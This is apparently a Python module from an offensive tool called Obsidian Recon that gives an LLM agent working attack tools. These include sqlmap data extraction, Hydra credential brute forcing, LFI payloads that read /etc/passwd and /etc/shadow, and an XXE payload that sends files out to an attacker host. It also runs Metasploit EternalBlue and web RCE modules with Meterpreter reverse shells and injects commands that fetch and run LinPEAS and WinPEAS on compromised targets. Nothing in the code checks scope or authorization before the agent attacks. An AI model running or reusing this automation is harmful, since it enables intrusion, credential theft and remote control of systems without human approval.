"""
app/agent/tools.py

Agent tool registry for Obsidian Recon.
Bridges the LLM agent to both internal validators AND real external exploit tools.

Tool categories:
  - VALIDATORS   : internal HTTP-probe validators (safe, existing)
  - REAL_TOOLS   : real external tools (sqlmap, hydra, nmap scripts, etc.)
  - METASPLOIT   : Metasploit RPC integration
  - POST_EXPLOIT : post-exploitation (linpeas, privesc, shell upgrade)
"""

from __future__ import annotations

import json
import logging
import shutil
import subprocess
import asyncio
import os
import re
import tempfile
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, Iterable, List, Optional, Tuple

logger = logging.getLogger(__name__)

TOOL_EXEC_TIMEOUT = int(os.getenv("AGENT_EXEC_TIMEOUT", "120"))
LHOST = os.getenv("OBSIDIAN_LHOST", "127.0.0.1")   # attacker IP for reverse shells
LPORT = int(os.getenv("OBSIDIAN_LPORT", "4444"))


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

class ToolCategory(str, Enum):
    VALIDATOR    = "validator"       # internal HTTP probes (existing)
    REAL_TOOL    = "real_tool"       # external CLI tools
    METASPLOIT   = "metasploit"      # Metasploit RPC
    POST_EXPLOIT = "post_exploit"    # post-exploitation
    RECON        = "recon"           # extra recon tools


@dataclass
class ToolResult:
    tool_id: str
    success: bool
    output: str
    raw: str = ""
    error: str = ""
    shell_obtained: bool = False
    shell_info: Dict[str, Any] = field(default_factory=dict)
    extra: Dict[str, Any] = field(default_factory=dict)

    def to_observation(self) -> Dict[str, Any]:
        return {
            "tool_id": self.tool_id,
            "success": self.success,
            "output": self.output[:4000],   # cap for LLM context
            "shell_obtained": self.shell_obtained,
            "shell_info": self.shell_info,
            "error": self.error,
        }


@dataclass
class AgentTool:
    tool_id: str
    name: str
    description: str
    category: ToolCategory
    requires_binary: Optional[str] = None   # binary name to check in PATH
    vuln_types: List[str] = field(default_factory=list)  # matching vuln types


# ---------------------------------------------------------------------------
# Tool registry
# ---------------------------------------------------------------------------

TOOL_REGISTRY: Dict[str, AgentTool] = {

    # ── Internal validators (existing, kept for compatibility) ──────────────
    "validate-sql-injection": AgentTool(
        tool_id="validate-sql-injection",
        name="SQL Injection Validator",
        description="Internal HTTP probe for SQL injection (error-based, boolean).",
        category=ToolCategory.VALIDATOR,
        vuln_types=["sql-injection", "sqli", "sqli-error", "sqli-blind"],
    ),
    "validate-reflected-xss": AgentTool(
        tool_id="validate-reflected-xss",
        name="Reflected XSS Validator",
        description="Internal HTTP probe for reflected XSS.",
        category=ToolCategory.VALIDATOR,
        vuln_types=["xss", "reflected-xss",
                    "cross-site-scripting", "reflected-cross-site-scripting"],
    ),
    "validate-ssrf": AgentTool(
        tool_id="validate-ssrf",
        name="SSRF Validator",
        description="Internal HTTP probe for SSRF via canary.",
        category=ToolCategory.VALIDATOR,
        vuln_types=["ssrf", "server-side-request-forgery"],
    ),
    "validate-exposed-resource": AgentTool(
        tool_id="validate-exposed-resource",
        name="Exposed Resource Validator",
        description="Checks for exposed .env, .git, backup files.",
        category=ToolCategory.VALIDATOR,
        vuln_types=["exposed-config", "git-exposed", "env-exposed",
                    "information-disclosure", "exposure",
                    "sensitive-data-exposure", "open-service-exposure",
                    "security-header", "reconnaissance", "http-variant-diff",
                    "misconfiguration"],
    ),
    "validate-command-execution-simulation": AgentTool(
        tool_id="validate-command-execution-simulation",
        name="Command Execution Validator",
        description="Internal marker-based command execution probe.",
        category=ToolCategory.VALIDATOR,
        vuln_types=["command-execution", "rce"],
    ),
    "validate-system-information-discovery-simulation": AgentTool(
        tool_id="validate-system-information-discovery-simulation",
        name="System Information Discovery Validator",
        description="Loopback system info discovery simulation.",
        category=ToolCategory.VALIDATOR,
        vuln_types=["system-information-discovery"],
    ),

    # ── Real tool: sqlmap ───────────────────────────────────────────────────
    "sqlmap-exploit": AgentTool(
        tool_id="sqlmap-exploit",
        name="sqlmap — Automated SQLi Exploitation",
        description=(
            "Runs sqlmap against the target endpoint to confirm and exploit "
            "SQL injection. Attempts database enumeration and data extraction. "
            "Use when SQL injection is confirmed or suspected."
        ),
        category=ToolCategory.REAL_TOOL,
        requires_binary="sqlmap",
        vuln_types=["sql-injection", "sqli", "sqli-error", "sqli-blind",
                    "sqli-time", "sqli-union", "sqli-boolean"],
    ),

    # ── Real tool: hydra ────────────────────────────────────────────────────
    "hydra-brute": AgentTool(
        tool_id="hydra-brute",
        name="Hydra — Credential Brute Force",
        description=(
            "Runs Hydra to brute-force login endpoints. Supports HTTP-POST, "
            "SSH, FTP, SMB, RDP. Use when default/weak credentials are suspected "
            "or a login form is exposed."
        ),
        category=ToolCategory.REAL_TOOL,
        requires_binary="hydra",
        vuln_types=["default-credentials", "weak-credentials", "brute-force"],
    ),

    # ── Real tool: nikto ────────────────────────────────────────────────────
    "nikto-scan": AgentTool(
        tool_id="nikto-scan",
        name="Nikto — Web Server Scanner",
        description=(
            "Runs Nikto for deep web server vulnerability scanning. "
            "Finds misconfigurations, outdated software, dangerous files."
        ),
        category=ToolCategory.REAL_TOOL,
        requires_binary="nikto",
        vuln_types=["misconfiguration", "information-disclosure", "cve"],
    ),

    # ── Real tool: gobuster ─────────────────────────────────────────────────
    "gobuster-dir": AgentTool(
        tool_id="gobuster-dir",
        name="Gobuster — Directory Brute Force",
        description=(
            "Runs Gobuster to enumerate hidden directories and files. "
            "Use when content discovery is incomplete or admin panels are suspected."
        ),
        category=ToolCategory.REAL_TOOL,
        requires_binary="gobuster",
        vuln_types=["exposed-admin-panel", "information-disclosure",
                    "discovered-path"],
    ),

    # ── Real tool: nmap exploit scripts ────────────────────────────────────
    "nmap-vuln-scripts": AgentTool(
        tool_id="nmap-vuln-scripts",
        name="Nmap — Vulnerability Scripts",
        description=(
            "Runs nmap with vuln/exploit NSE scripts against open ports. "
            "Covers EternalBlue (ms17-010), Heartbleed, ShellShock, etc."
        ),
        category=ToolCategory.REAL_TOOL,
        requires_binary="nmap",
        vuln_types=["open-service-exposure", "cve", "rce"],
    ),

    # ── Real tool: curl LFI ─────────────────────────────────────────────────
    "lfi-exploit": AgentTool(
        tool_id="lfi-exploit",
        name="LFI Exploiter",
        description=(
            "Tests and exploits Local File Inclusion vulnerabilities using "
            "path traversal payloads to read sensitive files like /etc/passwd."
        ),
        category=ToolCategory.REAL_TOOL,
        vuln_types=["lfi", "path-traversal"],
    ),

    # ── Real tool: XXE exploit ──────────────────────────────────────────────
    "xxe-exploit": AgentTool(
        tool_id="xxe-exploit",
        name="XXE Exploiter",
        description=(
            "Tests XML endpoints for XXE injection to read local files "
            "or trigger SSRF via malicious XML entities."
        ),
        category=ToolCategory.REAL_TOOL,
        vuln_types=["xxe"],
    ),

    # ── Metasploit ──────────────────────────────────────────────────────────
    "metasploit-eternalblue": AgentTool(
        tool_id="metasploit-eternalblue",
        name="Metasploit — EternalBlue (MS17-010)",
        description=(
            "Runs EternalBlue exploit via Metasploit against Windows SMB "
            "port 445. Use when port 445 is open and ms17-010 is detected."
        ),
        category=ToolCategory.METASPLOIT,
        requires_binary="msfconsole",
        vuln_types=["cve", "rce", "open-service-exposure"],
    ),
    "metasploit-web-rce": AgentTool(
        tool_id="metasploit-web-rce",
        name="Metasploit — Web RCE Module",
        description=(
            "Runs Metasploit web exploitation modules based on detected "
            "technology (Drupal, WordPress, Apache, PHP). "
            "Use when RCE is confirmed or CMS vulnerabilities detected."
        ),
        category=ToolCategory.METASPLOIT,
        requires_binary="msfconsole",
        vuln_types=["rce", "command-execution", "cve"],
    ),

    # ── Post-exploitation ───────────────────────────────────────────────────
    "linpeas-privesc": AgentTool(
        tool_id="linpeas-privesc",
        name="LinPEAS — Linux Privilege Escalation",
        description=(
            "Downloads and runs LinPEAS on the target via an existing shell "
            "to enumerate privilege escalation vectors. "
            "Use after obtaining a shell on a Linux target."
        ),
        category=ToolCategory.POST_EXPLOIT,
        vuln_types=["rce", "command-execution"],
    ),
    "winpeas-privesc": AgentTool(
        tool_id="winpeas-privesc",
        name="WinPEAS — Windows Privilege Escalation",
        description=(
            "Runs WinPEAS on the target via an existing shell to enumerate "
            "Windows privilege escalation vectors."
        ),
        category=ToolCategory.POST_EXPLOIT,
        vuln_types=["rce", "command-execution"],
    ),
}


# ---------------------------------------------------------------------------
# Binary availability check
# ---------------------------------------------------------------------------

def _binary_available(name: str) -> bool:
    return shutil.which(name) is not None


def _run(cmd: List[str], timeout: int = TOOL_EXEC_TIMEOUT,
         input_data: Optional[str] = None) -> tuple[int, str, str]:
    """Run a subprocess, return (returncode, stdout, stderr)."""
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            input=input_data,
            cwd="/tmp",
        )
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return -1, "", f"Command timed out after {timeout}s"
    except FileNotFoundError as e:
        return -1, "", str(e)
    except Exception as e:
        return -1, "", str(e)


# ---------------------------------------------------------------------------
# Tool executor functions
# ---------------------------------------------------------------------------

def _exec_sqlmap(options: Dict[str, Any]) -> ToolResult:
    """
    Run sqlmap against target URL.
    options: {target, parameter, method, data, cookie, level, risk}
    """
    target  = options.get("target", "")
    param   = options.get("parameter", "")
    method  = options.get("method", "GET").upper()
    data    = options.get("data", "")
    cookie  = options.get("cookie", "")
    level   = str(options.get("level", 2))
    risk    = str(options.get("risk", 2))

    if not target:
        return ToolResult("sqlmap-exploit", False, "", error="No target provided")

    cmd = [
        "sqlmap",
        "-u", target,
        "--batch",          # never ask for user input
        "--level", level,
        "--risk", risk,
        "--dbs",            # enumerate databases
        "--timeout", "30",
        "--retries", "2",
        "--output-dir", "/tmp/sqlmap_out",
        "--forms",
    ]

    if param:
        cmd += ["-p", param]
    if method == "POST" and data:
        cmd += ["--data", data]
    if cookie:
        cmd += ["--cookie", cookie]

    rc, stdout, stderr = _run(cmd, timeout=TOOL_EXEC_TIMEOUT)

    success = rc == 0 and ("is vulnerable" in stdout or
                           "available databases" in stdout or
                           "[INFO] fetched data" in stdout)

    # Extract DB names if found
    dbs = re.findall(r"\[\*\]\s+(.+)", stdout)
    output = f"sqlmap completed.\nDatabases found: {dbs}\n\n{stdout[-3000:]}"

    return ToolResult(
        tool_id="sqlmap-exploit",
        success=success,
        output=output,
        raw=stdout,
        error=stderr[:500] if not success else "",
        extra={"databases": dbs},
    )


def _exec_hydra(options: Dict[str, Any]) -> ToolResult:
    """
    Run Hydra brute force.
    options: {target, port, service, login_url, username, userlist,
              passlist, form_params}
    """
    target    = options.get("target", "")
    port      = str(options.get("port", 80))
    service   = options.get("service", "http-post-form")
    login_url = options.get("login_url", "/login")
    username  = options.get("username", "")
    userlist  = options.get("userlist",
                    "/usr/share/wordlists/metasploit/unix_users.txt")
    passlist  = options.get("passlist",
                    "/usr/share/wordlists/rockyou.txt")

    if not target:
        return ToolResult("hydra-brute", False, "", error="No target provided")

    if service == "http-post-form":
        form_params = options.get(
            "form_params",
            f"{login_url}:username=^USER^&password=^PASS^:F=incorrect"
        )
        service_str = f"http-post-form"
        cmd = [
            "hydra", "-t", "4", "-f",
            "-L", userlist if not username else "/dev/null",
            "-P", passlist,
            target,
            f"{service_str}:{form_params}",
        ]
        if username:
            cmd = [
                "hydra", "-t", "4", "-f",
                "-l", username,
                "-P", passlist,
                target,
                f"{service_str}:{form_params}",
            ]
    else:
        # SSH, FTP, SMB, RDP
        cmd = [
            "hydra", "-t", "4", "-f",
            "-L", userlist,
            "-P", passlist,
            "-s", port,
            target,
            service,
        ]

    rc, stdout, stderr = _run(cmd, timeout=TOOL_EXEC_TIMEOUT)

    success = "[" in stdout and "login:" in stdout
    creds = re.findall(r"login:\s*(\S+)\s+password:\s*(\S+)", stdout)
    output = f"Hydra completed.\nCredentials found: {creds}\n\n{stdout[-2000:]}"

    return ToolResult(
        tool_id="hydra-brute",
        success=success,
        output=output,
        raw=stdout,
        error=stderr[:500] if not success else "",
        extra={"credentials": creds},
    )


def _exec_nikto(options: Dict[str, Any]) -> ToolResult:
    target = options.get("target", "")
    port   = str(options.get("port", 80))
    ssl    = options.get("ssl", False)

    if not target:
        return ToolResult("nikto-scan", False, "", error="No target provided")

    cmd = ["nikto", "-h", target, "-p", port, "-Format", "txt",
           "-nointeractive", "-maxtime", "120"]
    if ssl:
        cmd.append("-ssl")

    rc, stdout, stderr = _run(cmd, timeout=150)
    success = rc == 0 and "OSVDB" in stdout or "+ " in stdout

    return ToolResult(
        tool_id="nikto-scan",
        success=success,
        output=stdout[-4000:],
        raw=stdout,
        error=stderr[:300],
    )


def _exec_gobuster(options: Dict[str, Any]) -> ToolResult:
    target   = options.get("target", "")
    wordlist = options.get(
        "wordlist",
        "/usr/share/wordlists/dirb/common.txt"
    )
    threads  = str(options.get("threads", 20))
    extensions = options.get("extensions", "php,html,txt,bak,zip")

    if not target:
        return ToolResult("gobuster-dir", False, "", error="No target provided")

    if not _binary_available("gobuster"):
        return ToolResult("gobuster-dir", False, "",
                          error="gobuster not found in PATH")

    cmd = [
        "gobuster", "dir",
        "-u", target,
        "-w", wordlist,
        "-t", threads,
        "-x", extensions,
        "-q",
        "--no-error",
        "--timeout", "10s",
    ]

    rc, stdout, stderr = _run(cmd, timeout=120)
    paths = re.findall(r"(/\S+)\s+\(Status: (\d+)\)", stdout)
    success = len(paths) > 0

    return ToolResult(
        tool_id="gobuster-dir",
        success=success,
        output=f"Paths found: {len(paths)}\n{stdout[-3000:]}",
        raw=stdout,
        error=stderr[:300],
        extra={"paths": paths},
    )


def _exec_nmap_vuln(options: Dict[str, Any]) -> ToolResult:
    target = options.get("target", "")
    ports  = options.get("ports", "")
    scripts = options.get("scripts",
        "vuln,exploit,ms17-010,heartbleed,shellshock,http-shellshock,"
        "smb-vuln-ms17-010,smb-vuln-ms08-067,ftp-vsftpd-backdoor,"
        "http-phpmyadmin-dir-traversal,http-sql-injection"
    )

    if not target:
        return ToolResult("nmap-vuln-scripts", False, "",
                          error="No target provided")

    cmd = ["nmap", "-sV", "--script", scripts, "--open", "-T4"]
    if ports:
        cmd += ["-p", ports]
    cmd.append(target)

    rc, stdout, stderr = _run(cmd, timeout=180)
    vulns = re.findall(r"(VULNERABLE|State: VULNERABLE)", stdout)
    success = len(vulns) > 0 or "VULNERABLE" in stdout

    return ToolResult(
        tool_id="nmap-vuln-scripts",
        success=success,
        output=stdout[-4000:],
        raw=stdout,
        error=stderr[:300],
        extra={"vulnerabilities_found": len(vulns)},
    )


def _exec_lfi(options: Dict[str, Any]) -> ToolResult:
    target    = options.get("target", "")
    parameter = options.get("parameter", "file")
    method    = options.get("method", "GET")

    if not target:
        return ToolResult("lfi-exploit", False, "", error="No target provided")

    # Build LFI payloads
    payloads = [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
        "....//....//....//....//etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../windows/system32/drivers/etc/hosts",
        "php://filter/convert.base64-encode/resource=index.php",
    ]

    results = []
    success = False

    for payload in payloads:
        if method.upper() == "GET":
            url = f"{target}?{parameter}={payload}" if "?" not in target \
                  else f"{target}&{parameter}={payload}"
            cmd = ["curl", "-sk", "--max-time", "10", url]
        else:
            cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST",
                   "-d", f"{parameter}={payload}", target]

        rc, stdout, stderr = _run(cmd, timeout=15)

        if "root:x:0:0" in stdout or "root:" in stdout:
            results.append(f"[SUCCESS] Payload: {payload}\n{stdout[:500]}")
            success = True
            break
        elif stdout and len(stdout) > 100:
            results.append(f"[POSSIBLE] Payload: {payload} → {len(stdout)} bytes")

    output = "\n".join(results) if results else "No LFI vulnerability confirmed."
    return ToolResult(
        tool_id="lfi-exploit",
        success=success,
        output=output,
        raw="\n".join(results),
    )


def _exec_xxe(options: Dict[str, Any]) -> ToolResult:
    target      = options.get("target", "")
    content_type = options.get("content_type", "application/xml")
    file_to_read = options.get("file_to_read", "/etc/passwd")

    if not target:
        return ToolResult("xxe-exploit", False, "", error="No target provided")

    payloads = [
        # Classic XXE
        f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_to_read}">]>
<root><data>&xxe;</data></root>""",
        # Blind XXE via error
        f"""<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file://{file_to_read}">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://{LHOST}:8080/?x=%file;'>">
%eval;
%exfil;
]><data>test</data>""",
    ]

    results = []
    success = False

    for i, payload in enumerate(payloads):
        cmd = [
            "curl", "-sk", "--max-time", "10",
            "-X", "POST",
            "-H", f"Content-Type: {content_type}",
            "-d", payload,
            target,
        ]
        rc, stdout, stderr = _run(cmd, timeout=15)

        if "root:" in stdout or "daemon:" in stdout or "bin:" in stdout:
            results.append(f"[SUCCESS] Payload {i+1} worked:\n{stdout[:1000]}")
            success = True
            break
        elif stdout:
            results.append(f"[RESPONSE] Payload {i+1}: {stdout[:300]}")

    return ToolResult(
        tool_id="xxe-exploit",
        success=success,
        output="\n".join(results) if results else "XXE not confirmed.",
        raw="\n".join(results),
    )


def _exec_metasploit_eternalblue(options: Dict[str, Any]) -> ToolResult:
    target = options.get("target", "")
    lhost  = options.get("lhost", LHOST)
    lport  = str(options.get("lport", LPORT))

    if not target:
        return ToolResult("metasploit-eternalblue", False, "",
                          error="No target provided")

    if not _binary_available("msfconsole"):
        return ToolResult("metasploit-eternalblue", False, "",
                          error="msfconsole not found in PATH")

    rc_script = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set ExitOnSession false
run -j
sleep 15
sessions -l
exit
"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc",
                                    delete=False) as f:
        f.write(rc_script)
        rc_path = f.name

    cmd = ["msfconsole", "-q", "-r", rc_path]
    rc, stdout, stderr = _run(cmd, timeout=90)
    os.unlink(rc_path)

    success = "Meterpreter session" in stdout or "session opened" in stdout
    sessions = re.findall(r"(\d+)\s+.*?Meterpreter.*?(\S+:\d+)", stdout)

    shell_info = {}
    if sessions:
        shell_info = {
            "session_id": sessions[0][0],
            "connection": sessions[0][1],
            "type": "meterpreter",
        }

    return ToolResult(
        tool_id="metasploit-eternalblue",
        success=success,
        output=stdout[-3000:],
        raw=stdout,
        shell_obtained=success,
        shell_info=shell_info,
        error=stderr[:300] if not success else "",
    )


def _exec_metasploit_web_rce(options: Dict[str, Any]) -> ToolResult:
    target  = options.get("target", "")
    module  = options.get("module", "")
    lhost   = options.get("lhost", LHOST)
    lport   = str(options.get("lport", LPORT))
    extra   = options.get("extra_options", {})

    if not target or not module:
        return ToolResult("metasploit-web-rce", False, "",
                          error="target and module are required")

    if not _binary_available("msfconsole"):
        return ToolResult("metasploit-web-rce", False, "",
                          error="msfconsole not found in PATH")

    extra_lines = "\n".join(f"set {k} {v}" for k, v in extra.items())
    rc_script = f"""
use {module}
set RHOSTS {target}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD linux/x86/meterpreter/reverse_tcp
{extra_lines}
run -j
sleep 20
sessions -l
exit
"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc",
                                    delete=False) as f:
        f.write(rc_script)
        rc_path = f.name

    cmd = ["msfconsole", "-q", "-r", rc_path]
    rc, stdout, stderr = _run(cmd, timeout=120)
    os.unlink(rc_path)

    success = "session opened" in stdout or "Meterpreter session" in stdout
    sessions = re.findall(r"(\d+)\s+.*?Meterpreter.*?(\S+:\d+)", stdout)

    shell_info = {}
    if sessions:
        shell_info = {
            "session_id": sessions[0][0],
            "connection": sessions[0][1],
            "type": "meterpreter",
            "module": module,
        }

    return ToolResult(
        tool_id="metasploit-web-rce",
        success=success,
        output=stdout[-3000:],
        raw=stdout,
        shell_obtained=success,
        shell_info=shell_info,
        error=stderr[:300] if not success else "",
    )


def _exec_linpeas(options: Dict[str, Any]) -> ToolResult:
    """
    Delivers and runs LinPEAS on target via existing reverse shell / RCE.
    Requires a method to deliver — here we use a web delivery stub.
    options: {target, rce_endpoint, rce_parameter, method}
    """
    target        = options.get("target", "")
    rce_endpoint  = options.get("rce_endpoint", "")
    rce_parameter = options.get("rce_parameter", "cmd")
    lhost         = options.get("lhost", LHOST)

    if not rce_endpoint:
        return ToolResult("linpeas-privesc", False, "",
                          error="rce_endpoint required to deliver LinPEAS")

    # Start a local HTTP server to serve linpeas.sh
    linpeas_url = (
        "https://github.com/peass-ng/PEASS-ng/releases/latest/"
        "download/linpeas.sh"
    )

    # Inject curl | sh via the RCE parameter
    payload = f"curl -L {linpeas_url} | sh"
    url = f"{rce_endpoint}?{rce_parameter}={payload}"
    cmd = ["curl", "-sk", "--max-time", "60", url]
    rc, stdout, stderr = _run(cmd, timeout=90)

    success = ("SUID" in stdout or "sudo" in stdout or
               "writable" in stdout or "CVE" in stdout)

    return ToolResult(
        tool_id="linpeas-privesc",
        success=success,
        output=stdout[-4000:],
        raw=stdout,
        error=stderr[:300] if not success else "",
    )


def _exec_winpeas(options: Dict[str, Any]) -> ToolResult:
    rce_endpoint  = options.get("rce_endpoint", "")
    rce_parameter = options.get("rce_parameter", "cmd")

    if not rce_endpoint:
        return ToolResult("winpeas-privesc", False, "",
                          error="rce_endpoint required")

    payload = (
        "powershell -c \"IEX(New-Object Net.WebClient)."
        f"DownloadString('https://raw.githubusercontent.com/"
        f"peass-ng/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')\""
    )
    url = f"{rce_endpoint}?{rce_parameter}={payload}"
    cmd = ["curl", "-sk", "--max-time", "60", url]
    rc, stdout, stderr = _run(cmd, timeout=90)

    success = ("AlwaysInstallElevated" in stdout or
               "Unquoted" in stdout or
               "SeImpersonatePrivilege" in stdout)

    return ToolResult(
        tool_id="winpeas-privesc",
        success=success,
        output=stdout[-4000:],
        raw=stdout,
        error=stderr[:300] if not success else "",
    )


# ---------------------------------------------------------------------------
# LLM-guided tool selector
# ---------------------------------------------------------------------------

# Maps vuln type → best tool to try first
VULN_TO_TOOL_PRIORITY: Dict[str, List[str]] = {
    "sql-injection":          ["sqlmap-exploit", "validate-sql-injection"],
    "sqli":                   ["sqlmap-exploit", "validate-sql-injection"],
    "sqli-error":             ["sqlmap-exploit", "validate-sql-injection"],
    "sqli-blind":             ["sqlmap-exploit"],
    "sqli-time":              ["sqlmap-exploit"],
    "sqli-union":             ["sqlmap-exploit"],
    "xss":                    ["validate-reflected-xss"],
    "reflected-xss":          ["validate-reflected-xss"],
    "ssrf":                   ["validate-ssrf"],
    "lfi":                    ["lfi-exploit"],
    "path-traversal":         ["lfi-exploit"],
    "xxe":                    ["xxe-exploit"],
    "rce":                    ["metasploit-web-rce",
                               "validate-command-execution-simulation"],
    "command-execution":      ["validate-command-execution-simulation",
                               "linpeas-privesc"],
    "default-credentials":    ["hydra-brute"],
    "weak-credentials":       ["hydra-brute"],
    "brute-force":            ["hydra-brute"],
    "exposed-config":         ["validate-exposed-resource"],
    "git-exposed":            ["validate-exposed-resource"],
    "env-exposed":            ["validate-exposed-resource"],
    "information-disclosure": ["validate-exposed-resource", "nikto-scan"],
    "system-information-discovery": [
        "validate-system-information-discovery-simulation"],
    "misconfiguration":       ["nikto-scan"],
    "open-service-exposure":  ["nmap-vuln-scripts"],
    "cve":                    ["nmap-vuln-scripts", "metasploit-eternalblue"],
    "discovered-path":        ["gobuster-dir"],
    "exposed-admin-panel":    ["gobuster-dir", "hydra-brute"],
}


def suggest_tools_for_vuln(vuln_type: str) -> List[str]:
    """Return ordered list of tool_ids to try for a given vulnerability type."""
    normalized = vuln_type.lower().replace(" ", "-")
    return VULN_TO_TOOL_PRIORITY.get(normalized, ["validate-sql-injection"])


# ---------------------------------------------------------------------------
# Main dispatcher
# ---------------------------------------------------------------------------

def execute_tool(tool_id: str, options: Dict[str, Any]) -> ToolResult:
    """
    Main entry point. Dispatches to the correct tool executor.
    Called by AgentToolExecutor in executor.py.
    """
    tool = TOOL_REGISTRY.get(tool_id)
    if not tool:
        return ToolResult(
            tool_id=tool_id,
            success=False,
            output="",
            error=f"Unknown tool_id: {tool_id}",
        )

    # Check binary availability for tools that need it
    if tool.requires_binary and not _binary_available(tool.requires_binary):
        return ToolResult(
            tool_id=tool_id,
            success=False,
            output="",
            error=f"Required binary '{tool.requires_binary}' not found in PATH. "
                  f"Install it first.",
        )

    logger.info("Executing tool: %s | options: %s", tool_id,
                {k: v for k, v in options.items() if k != "cookie"})

    # Dispatcher
    executors = {
        # Validators — handled externally by AgentToolExecutor via dispatcher
        # These are kept here for completeness; real dispatch goes to
        # validation/dispatcher.py via the existing executor.py flow.
        "validate-sql-injection":                   None,
        "validate-reflected-xss":                   None,
        "validate-ssrf":                             None,
        "validate-exposed-resource":                 None,
        "validate-command-execution-simulation":     None,
        "validate-system-information-discovery-simulation": None,

        # Real tools
        "sqlmap-exploit":           _exec_sqlmap,
        "hydra-brute":              _exec_hydra,
        "nikto-scan":               _exec_nikto,
        "gobuster-dir":             _exec_gobuster,
        "nmap-vuln-scripts":        _exec_nmap_vuln,
        "lfi-exploit":              _exec_lfi,
        "xxe-exploit":              _exec_xxe,

        # Metasploit
        "metasploit-eternalblue":   _exec_metasploit_eternalblue,
        "metasploit-web-rce":       _exec_metasploit_web_rce,

        # Post-exploit
        "linpeas-privesc":          _exec_linpeas,
        "winpeas-privesc":          _exec_winpeas,
    }

    executor_fn = executors.get(tool_id)

    if executor_fn is None:
        # Validator — signal back to caller to use existing validation dispatcher
        return ToolResult(
            tool_id=tool_id,
            success=True,
            output="__USE_VALIDATOR_DISPATCHER__",
            extra={"use_validator": True},
        )

    try:
        return executor_fn(options)
    except Exception as exc:
        logger.exception("Tool %s raised an exception", tool_id)
        return ToolResult(
            tool_id=tool_id,
            success=False,
            output="",
            error=str(exc),
        )


# ---------------------------------------------------------------------------
# Tool catalog for LLM prompt (fed into LLMPlanner)
# ---------------------------------------------------------------------------

def get_tool_catalog() -> List[Dict[str, Any]]:
    """
    Returns tool catalog formatted for LLM system prompt.
    Replaces the hardcoded 6-tool catalog in the existing llm_planner.py.
    """
    catalog = []
    for tool_id, tool in TOOL_REGISTRY.items():
        available = True
        if tool.requires_binary:
            available = _binary_available(tool.requires_binary)
        catalog.append({
            "tool_id": tool_id,
            "name": tool.name,
            "description": tool.description,
            "category": tool.category.value,
            "available": available,
            "vuln_types": tool.vuln_types,
        })
    return catalog


def get_available_tool_catalog() -> List[Dict[str, Any]]:
    """Returns only tools whose binaries are available on this system."""
    return [t for t in get_tool_catalog() if t["available"]]


# ---------------------------------------------------------------------------
# Backward-compatible shims for the old agent tool API
# (AgentToolDefinition, AgentToolRegistry, etc.)
# ---------------------------------------------------------------------------

from types import MappingProxyType


def normalize_vulnerability_type(value: str) -> str:
    """Normalize vulnerability type strings for consistent matching."""
    return value.strip().lower().replace("-", "_").replace(" ", "_")


class UnknownAgentToolError(LookupError):
    pass


# Map new tool_ids to their old validator_ids for the validators
_VALIDATOR_ID_MAP: Dict[str, str] = {
    "validate-sql-injection": "generic-http-sqli",
    "validate-reflected-xss": "generic-http-reflected-xss",
    "validate-ssrf": "generic-http-ssrf",
    "validate-exposed-resource": "generic-http-exposed-resource",
    "validate-command-execution-simulation": "generic-http-command-execution",
    "validate-system-information-discovery-simulation": "controlled-http-system-information-discovery",
}

_DEFAULT_ALLOWED_OPTIONS: Tuple[str, ...] = (
    "endpoint",
    "http_method",
    "parameter_name",
    "parameter_location",
)


# Per-validator capability and targeting metadata preserved from the original
# six-tool agent contract. Real external tools expose no extra capabilities
# and accept no planner-supplied targeting options.
_VALIDATOR_TOOL_METADATA: Dict[str, Dict[str, Tuple[str, ...]]] = {
    "validate-sql-injection": {
        "requires_any": ("discovered_services", "reachable_web_application"),
        "provides": ("application_compromise", "possible_database_access"),
        "allowed_options": _DEFAULT_ALLOWED_OPTIONS,
    },
    "validate-reflected-xss": {
        "requires_any": ("discovered_services", "reachable_web_application"),
        "allowed_options": _DEFAULT_ALLOWED_OPTIONS,
    },
    "validate-ssrf": {
        "requires_any": ("discovered_services", "reachable_web_application"),
        "allowed_options": ("endpoint",),
    },
    "validate-exposed-resource": {
        "requires_any": (
            "discovered_services",
            "reachable_web_application",
            "adversary_reconnaissance_observed",
        ),
        "provides": ("potential_information_exposure",),
        "allowed_options": ("endpoint",),
    },
    "validate-command-execution-simulation": {
        "requires_any": ("application_compromise",),
        "provides": ("command_execution",),
        "allowed_options": (),
    },
    "validate-system-information-discovery-simulation": {
        "requires_any": ("command_execution",),
        "provides": ("system_information",),
        "allowed_options": (),
    },
}


@dataclass(frozen=True)
class AgentToolDefinition:
    tool_id: str
    validator_id: Optional[str]
    vulnerability_types: Tuple[str, ...]
    description: str
    requires_all: Tuple[str, ...] = field(default_factory=tuple)
    requires_any: Tuple[str, ...] = field(default_factory=tuple)
    provides: Tuple[str, ...] = field(default_factory=tuple)
    automatic_allowed: bool = True
    allowed_options: Tuple[str, ...] = field(default_factory=tuple)

    def __post_init__(self) -> None:
        for name in ("tool_id", "description"):
            value = getattr(self, name)
            if not isinstance(value, str) or not value.strip():
                raise ValueError(f"{name} must be a non-empty string")
        for name in (
            "vulnerability_types",
            "requires_all",
            "requires_any",
            "provides",
            "allowed_options",
        ):
            values = tuple(getattr(self, name))
            if not all(isinstance(value, str) and value for value in values):
                raise TypeError(f"{name} must contain non-empty strings")
            if name == "vulnerability_types":
                values = tuple(
                    normalize_vulnerability_type(value) for value in values
                )
            object.__setattr__(self, name, tuple(dict.fromkeys(values)))
        if not self.vulnerability_types:
            raise ValueError("vulnerability_types cannot be empty")
